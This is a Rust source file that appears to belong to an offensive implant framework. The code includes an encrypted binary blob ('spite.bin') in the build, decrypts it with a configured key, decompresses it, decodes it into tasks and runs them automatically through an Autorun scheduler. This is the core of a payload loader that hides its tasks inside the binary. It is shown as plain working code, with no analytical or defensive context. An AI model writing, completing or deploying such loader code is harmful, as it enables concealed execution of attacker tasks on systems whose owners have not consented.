use lazy_static::lazy_static;
use malefic_core::config;
use malefic_helper::debug;
use malefic_proto::compress::decompress;
use malefic_proto::crypto::new_cryptor;
use malefic_proto::decode;
use crate::autorun::Autorun;

pub mod autorun;
pub mod scheduler;


lazy_static! {
    pub static ref DATA: &'static [u8] = include_bytes!("../../resources/spite.bin");
}

pub fn run() -> anyhow::Result<()> {
    let iv = config::KEY.clone().iter().rev().cloned().collect();
    let mut cryptor = new_cryptor(config::KEY.clone().to_vec(), iv);
    let decrypted = cryptor.decrypt(DATA.to_vec())?;
    let decompressed = decompress(&*decrypted)?;
    match decode(decompressed) {
        Ok(spites) => {
            let tasks: Vec<_> = spites.spites.into_iter().collect();
            let mut autorun = Autorun::new().unwrap();

            let results = autorun.execute(tasks).unwrap();

            debug!("results: {:#?}", results);
            Ok(())
        },
        Err(e) => {
            debug!("Failed to decode spites: {:?}", e);
            Err(e.into())
        }
    }
}
